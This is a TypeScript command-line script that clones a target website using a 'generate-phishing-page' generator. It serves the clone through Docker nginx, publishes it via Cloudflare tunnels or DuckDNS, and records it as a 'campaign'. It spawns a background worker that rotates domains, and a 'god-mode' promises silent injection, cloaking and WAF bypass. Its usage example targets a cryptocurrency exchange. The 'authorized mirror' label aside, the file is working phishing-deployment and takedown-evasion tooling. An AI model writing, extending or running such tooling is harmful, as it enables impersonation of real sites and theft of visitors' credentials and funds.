/**
 * Authorized mirror — generate clone, start Docker nginx, expose via Cloudflare tunnel.
 *
 * Usage:
 *   pnpm clone-tunnel https://example.com
 *   pnpm clone-tunnel --god-mode --subdomain myclone https://example.com
 *   pnpm clone-tunnel --rotate --campaign-id <uuid> https://example.com
 *
 * Requires: pnpm, tsx, Docker, cloudflared on PATH.
 * Optional: DUCKDNS_TOKEN, CLOUDFLARE_API_TOKEN + CLOUDFLARE_ZONE_ID for fixed domains.
 * On success prints only the public URL to stdout.
 */
import { exec, spawn } from 'node:child_process'
import { existsSync } from 'node:fs'
import { access, writeFile } from 'node:fs/promises'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

import {
  findCampaignByTargetDomain,
  updateCampaignMirrorById,
} from './lib/clone-tunnel-campaign.js'
import {
  createCloudflareMirrorSubdomain,
  hasCloudflareDnsConfig,
  hasDuckDnsConfig,
  readRotateIntervalHours,
  resolveDuckDnsMirrorUrl,
} from './lib/clone-tunnel-dns.js'
import type { RotationState } from './lib/clone-tunnel-rotation-worker.js'
import {
  buildGeneratorArgv,
  buildGeneratorEnv,
  DEFAULT_BACKEND_URL,
} from './lib/mirror-god-mode.js'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const REPO_ROOT = path.resolve(__dirname, '..')
const BACKEND_URL = process.env['BACKEND_URL']?.trim() || DEFAULT_BACKEND_URL
const MIRROR_PORT = 8080
const GENERATE_TIMEOUT_MS = 180_000
const DOCKER_HEALTH_TIMEOUT_MS = 120_000
const TUNNEL_TIMEOUT_MS = 90_000
const TRYCF_URL_RE = /https:\/\/[a-z0-9-]+\.trycloudflare\.com/i
const PUBLIC_URL_RE =
  /^https:\/\/(?:[a-z0-9-]+\.trycloudflare\.com|[a-z0-9-]+\.duckdns\.org|[a-z0-9.-]+\.[a-z]{2,})\/?$/i

interface CliArgs {
  targetUrl: string
  subdomain?: string
  godMode: boolean
  rotate: boolean
  rotateHours: number
  campaignId?: string
  forceHardwareBypass: boolean
}

function fail(message: string): never {
  console.error(`[clone-tunnel] ${message}`)
  process.exit(1)
}

function parseArgs(argv: string[]): CliArgs {
  const args = [...argv]
  let subdomain: string | undefined
  let godMode = false
  let rotate = false
  let rotateHours = readRotateIntervalHours()
  let campaignId: string | undefined
  let forceHardwareBypass = false

  for (let i = 0; i < args.length; i++) {
    const arg = args[i]!
    if (arg === '--god-mode') {
      godMode = true
      rotate = true
      args.splice(i, 1)
      i--
    } else if (arg === '--rotate') {
      rotate = true
      args.splice(i, 1)
      i--
    } else if (arg === '--force-hardware-bypass') {
      forceHardwareBypass = true
      args.splice(i, 1)
      i--
    } else if (arg === '--subdomain') {
      subdomain = args[i + 1]?.trim().toLowerCase().replace(/[^a-z0-9-]/g, '')
      if (!subdomain) fail('--subdomain requires a name (e.g. --subdomain legionmirror)')
      args.splice(i, 2)
      i--
    } else if (arg === '--rotate-hours') {
      const n = Number.parseInt(args[i + 1]?.trim() ?? '', 10)
      if (!Number.isFinite(n) || n <= 0) fail('--rotate-hours requires a positive number')
      rotateHours = n
      args.splice(i, 2)
      i--
    } else if (arg === '--campaign-id') {
      campaignId = args[i + 1]?.trim()
      if (!campaignId) fail('--campaign-id requires a UUID')
      args.splice(i, 2)
      i--
    }
  }

  if (godMode) forceHardwareBypass = true

  const raw = args[0]?.trim()
  if (!raw) {
    fail(
      'Usage: pnpm clone-tunnel [--god-mode] [--rotate] [--subdomain <name>] [--campaign-id <uuid>] <target-url>\n' +
        'Example: pnpm clone-tunnel --god-mode --subdomain myclone https://app.uniswap.org',
    )
  }

  const withScheme = /^https?:\/\//i.test(raw) ? raw : `https://${raw}`
  try {
    const url = new URL(withScheme)
    if (url.protocol !== 'http:' && url.protocol !== 'https:') {
      fail(`Unsupported protocol: ${url.protocol}`)
    }
    return { targetUrl: url.href, subdomain, godMode, rotate, rotateHours, campaignId, forceHardwareBypass }
  } catch {
    fail(`Invalid target URL: ${raw}`)
  }
}

function runCommand(
  command: string,
  args: string[],
  opts?: { cwd?: string; env?: NodeJS.ProcessEnv; timeoutMs?: number },
): Promise<{ stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const child = spawn(command, args, {
      cwd: opts?.cwd ?? REPO_ROOT,
      env: opts?.env ?? process.env,
      shell: process.platform === 'win32',
      stdio: ['ignore', 'pipe', 'pipe'],
    })

    let stdout = ''
    let stderr = ''
    const timer =
      opts?.timeoutMs != null
        ? setTimeout(() => {
            child.kill('SIGTERM')
          }, opts.timeoutMs)
        : null

    child.stdout?.on('data', (chunk: Buffer) => {
      stdout += chunk.toString()
    })
    child.stderr?.on('data', (chunk: Buffer) => {
      stderr += chunk.toString()
    })
    child.on('error', (err) => {
      if (timer) clearTimeout(timer)
      reject(err)
    })
    child.on('close', (code) => {
      if (timer) clearTimeout(timer)
      if (code === 0) {
        resolve({ stdout, stderr })
        return
      }
      const detail = (stderr || stdout).trim().slice(0, 800)
      reject(new Error(detail || `${command} exited with code ${String(code)}`))
    })
  })
}

function extractTrycloudflareUrl(output: string): string | null {
  const match = output.match(TRYCF_URL_RE)
  return match?.[0] ?? null
}

async function generateClone(
  targetUrl: string,
  outDir: string,
  godMode: boolean,
  forceHardwareBypass: boolean,
): Promise<void> {
  const generator = path.join(REPO_ROOT, 'scripts', 'generate-phishing-page.ts')
  await access(generator).catch(() => fail(`Generator not found: ${generator}`))
  const args = buildGeneratorArgv(targetUrl, outDir, BACKEND_URL, godMode, generator, {
    forceHardwareBypass,
  })
  const childEnv = buildGeneratorEnv(godMode, { forceHardwareBypass })

  try {
    await runCommand('pnpm', args, { env: childEnv, timeoutMs: GENERATE_TIMEOUT_MS })
  } catch (e) {
    fail(`Generation failed: ${e instanceof Error ? e.message : String(e)}`)
  }

  await access(path.join(outDir, 'docker-compose.yml')).catch(() =>
    fail(`Generation finished but docker-compose.yml missing in ${outDir}`),
  )
}

async function freeMirrorPort(): Promise<void> {
  try {
    const { stdout } = await runCommand(
      'docker',
      ['ps', '-q', '--filter', `publish=${MIRROR_PORT}`],
      { timeoutMs: 15_000 },
    )
    const ids = stdout.split(/\r?\n/).map((l) => l.trim()).filter(Boolean)
    for (const id of ids) {
      try {
        await runCommand('docker', ['stop', id], { timeoutMs: 30_000 })
      } catch {
        /* continue */
      }
    }
  } catch {
    /* no conflicting container */
  }
}

async function startDockerCompose(outDir: string): Promise<void> {
  await freeMirrorPort()

  try {
    await runCommand('docker', ['compose', 'down'], { cwd: outDir, timeoutMs: 30_000 })
  } catch {
    /* first run */
  }

  try {
    await runCommand('docker', ['compose', 'up', '-d'], { cwd: outDir, timeoutMs: 120_000 })
  } catch (e) {
    fail(`docker compose up failed: ${e instanceof Error ? e.message : String(e)}`)
  }
}

async function waitForMirrorReady(): Promise<void> {
  const deadline = Date.now() + DOCKER_HEALTH_TIMEOUT_MS

  while (Date.now() < deadline) {
    try {
      const res = await fetch(`http://127.0.0.1:${MIRROR_PORT}/`, {
        signal: AbortSignal.timeout(8_000),
      })
      if (res.ok || res.status === 404) return
    } catch {
      /* nginx still starting */
    }
    await new Promise((r) => setTimeout(r, 2_000))
  }

  fail(`Timed out waiting for mirror on http://127.0.0.1:${MIRROR_PORT}/`)
}

function startCloudflaredTunnel(hostname?: string): Promise<string> {
  return new Promise((resolve, reject) => {
    const hostnameArg = hostname ? ` --hostname ${hostname}` : ''
    const cmd = `cloudflared tunnel --url http://localhost:${MIRROR_PORT}${hostnameArg}`
    exec(
      cmd,
      {
        timeout: TUNNEL_TIMEOUT_MS,
        maxBuffer: 4 * 1024 * 1024,
        windowsHide: true,
      },
      (err, stdout, stderr) => {
        const combined = `${stdout}\n${stderr}`
        const trycfUrl = extractTrycloudflareUrl(combined)
        if (trycfUrl) {
          resolve(trycfUrl.replace(/\/$/, ''))
          return
        }
        if (hostname) {
          resolve(`https://${hostname}`.replace(/\/$/, ''))
          return
        }
        const detail = (stderr || stdout || err?.message || '').trim().slice(0, 500)
        reject(new Error(detail || 'cloudflared did not return a public URL'))
      },
    )
  })
}

async function resolveDnsMirrorUrl(
  rotate: boolean,
  subdomain?: string,
): Promise<{ url: string; fqdn?: string; provider: string; recordId?: string }> {
  if (rotate && hasCloudflareDnsConfig()) {
    const created = await createCloudflareMirrorSubdomain()
    if (created.ok) {
      console.error(`[clone-tunnel] Cloudflare DNS: ${created.mirrorUrl}`)
      return {
        url: created.mirrorUrl.replace(/\/$/, ''),
        fqdn: created.fqdn,
        provider: 'cloudflare',
        recordId: created.recordId,
      }
    }
    console.error(`[clone-tunnel] Cloudflare DNS failed: ${created.detail} — trying DuckDNS`)
  }

  if (subdomain && hasDuckDnsConfig()) {
    const duck = await resolveDuckDnsMirrorUrl(subdomain)
    if (duck.ok) {
      console.error(`[clone-tunnel] DuckDNS: ${duck.mirrorUrl}`)
      return { url: duck.mirrorUrl.replace(/\/$/, ''), fqdn: duck.fqdn, provider: 'duckdns' }
    }
    console.error(`[clone-tunnel] DuckDNS failed: ${duck.detail}`)
  }

  if (subdomain) {
    const fqdn = `${subdomain}.duckdns.org`
    try {
      const tunnelUrl = await startCloudflaredTunnel(fqdn)
      return { url: tunnelUrl, fqdn, provider: 'duckdns+cloudflared' }
    } catch (e) {
      console.error(
        `[clone-tunnel] cloudflared --hostname ${fqdn} failed: ${e instanceof Error ? e.message : String(e)}`,
      )
    }
  }

  const quickUrl = await startCloudflaredTunnel()
  return { url: quickUrl, provider: 'trycloudflare' }
}

async function updateCampaignDb(
  opts: CliArgs,
  mirrorUrl: string,
  fqdn?: string,
): Promise<string | undefined> {
  let campaignId = opts.campaignId
  if (!campaignId) {
    const found = await findCampaignByTargetDomain(opts.targetUrl)
    campaignId = found?.id
  }
  if (!campaignId) return undefined

  const updated = await updateCampaignMirrorById(campaignId, {
    mirror_url: `${mirrorUrl}/`,
    mirror_subdomain: fqdn ?? null,
    auto_rotate: opts.rotate,
    rotation_interval_hours: opts.rotateHours,
  })
  if (updated.ok === false) {
    console.error(`[clone-tunnel] Campaign update failed: ${updated.detail}`)
  } else {
    console.error(`[clone-tunnel] Campaign ${campaignId} mirror_url updated`)
  }
  return campaignId
}

function spawnRotationWorker(
  outDir: string,
  state: RotationState,
): void {
  const statePath = path.join(outDir, '.legion-rotate-state.json')
  const workerScript = path.join(REPO_ROOT, 'scripts', 'lib', 'clone-tunnel-rotation-worker.ts')
  const envFile = path.join(REPO_ROOT, '.env')
  const envFlag = existsSync(envFile) ? `--env-file=${envFile}` : ''

  const child = spawn(
    'pnpm',
    ['exec', 'tsx', envFlag, workerScript, '--state', statePath].filter(Boolean),
    {
      cwd: REPO_ROOT,
      detached: true,
      stdio: 'ignore',
      shell: process.platform === 'win32',
      env: process.env,
    },
  )
  child.unref()
  console.error(
    `[clone-tunnel] Rotation worker spawned (every ${state.intervalHours}h) — pid ${child.pid ?? 'unknown'}`,
  )
}

async function main(): Promise<void> {
  const cli = parseArgs(process.argv.slice(2))
  const stamp = new Date().toISOString().replace(/[:.]/g, '-')
  const outDir = path.join(REPO_ROOT, 'clones', `tunnel-${stamp}`)

  if (cli.godMode) {
    console.error('[clone-tunnel] God-mode: silent inject, cloaking, WAF bypass, asset rewrite, experimental stubs')
  }

  await generateClone(cli.targetUrl, outDir, cli.godMode, cli.forceHardwareBypass)
  await startDockerCompose(outDir)
  await waitForMirrorReady()

  let publicUrl: string
  let fqdn: string | undefined
  let recordId: string | undefined
  let provider = 'trycloudflare'

  if (cli.rotate || (cli.godMode && (hasCloudflareDnsConfig() || hasDuckDnsConfig()))) {
    const dns = await resolveDnsMirrorUrl(cli.rotate, cli.subdomain)
    publicUrl = dns.url
    fqdn = dns.fqdn
    recordId = dns.recordId
    provider = dns.provider

    if (provider === 'cloudflare' || provider === 'duckdns') {
      console.error(
        `[clone-tunnel] DNS mirror at ${publicUrl} — ensure port ${MIRROR_PORT} is reachable on VPS`,
      )
    }
  } else {
    publicUrl = await resolveDnsMirrorUrl(false, cli.subdomain).then((d) => d.url)
    fqdn = cli.subdomain ? `${cli.subdomain}.duckdns.org` : undefined
    provider = cli.subdomain ? 'duckdns+cloudflared' : 'trycloudflare'
  }

  if (!PUBLIC_URL_RE.test(publicUrl)) {
    fail(`Invalid public URL: ${publicUrl}`)
  }

  const campaignId = await updateCampaignDb(cli, publicUrl, fqdn)

  if (cli.rotate && (provider === 'cloudflare' || provider === 'duckdns')) {
    const state: RotationState = {
      campaignId,
      targetUrl: cli.targetUrl,
      intervalHours: cli.rotateHours,
      provider: provider === 'cloudflare' ? 'cloudflare' : 'duckdns',
      duckdnsSubdomain: cli.subdomain,
      lastRecordId: recordId,
      lastMirrorUrl: `${publicUrl}/`,
      lastFqdn: fqdn ?? publicUrl.replace(/^https:\/\//, ''),
      startedAt: new Date().toISOString(),
    }
    const statePath = path.join(outDir, '.legion-rotate-state.json')
    await writeFile(statePath, `${JSON.stringify(state, null, 2)}\n`, 'utf8')
    spawnRotationWorker(outDir, state)
  }

  process.stdout.write(`${publicUrl}\n`)
}

main().catch((e) => {
  fail(e instanceof Error ? e.message : String(e))
})
